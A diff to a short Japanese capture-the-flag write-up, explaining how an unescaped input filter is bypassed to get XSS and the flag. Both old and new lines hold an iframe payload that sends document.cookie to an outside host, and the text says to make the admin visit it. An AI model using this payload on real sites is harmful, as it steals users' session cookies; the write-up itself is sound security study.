@@ -49,7 +49,9 @@ function clean(input) {
 特にエスケープを行っている様子はないのでうまくすればXSSできそうである。
 
 `>`を入力してから`<`を入力するとbracketsの値をうまく0に調節できる。
-よって、`><iframe src="javascript:window.location.href='https://example.com/?'+document.cookie">`を入力して表示させるとうまくページ遷移させることができたので、これをadminに踏ませるとフラグが手に入る。
+よって、`><iframe src="javascript:window.location.href='https://example.com/?'+document.cookie">`を入力して表示させるとうまくページ遷移させることができた。
+
+後は`><iframe ...>`が埋め込まれたURLをadminに踏ませるとフラグが手に入る。
 
 ```
 flag{54n1t1z4t10n_k1nd4_h4rd}
